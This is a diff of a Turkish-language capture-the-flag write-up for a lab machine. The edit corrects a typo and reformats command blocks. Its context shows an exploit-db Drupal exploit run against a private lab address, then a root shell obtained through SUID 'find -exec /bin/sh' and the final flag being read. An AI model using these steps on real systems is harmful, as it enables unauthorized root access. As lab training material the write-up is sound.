@@ -210,7 +210,7 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 /sbin/mount.nfs
 </pre>
 
-<p>Bingo! find aracının -exec parametresi var. Bunu sömürebiliriz. Konudan bağımsız isthiza'da da dediği gibi exec şeytani bir fonksiyondur! </p>
+<p>Bingo! find aracının -exec parametresi var. Bunu sömürebiliriz. Konudan bağımsız istihza'da da dediği gibi exec şeytani bir fonksiyondur! </p>
 <pre>find -exec '/bin/sh' \;</pre>
 <pre>whoami</pre>
 <pre>
@@ -219,8 +219,8 @@ root
 <p>/root içerisinde son flag isimli bir dosya var. Hiç flag bulmadan son flag'e ulaşmak değişik oldu :)</p>
 <pre>
 cd /root</pre>
-<pre>ls</pre>
-<pre>thefinalflag.txt
+<pre>ls
+thefinalflag.txt
 </pre><pre>
 cat thefinalflag.txt</pre><pre>
 Well done!!!!
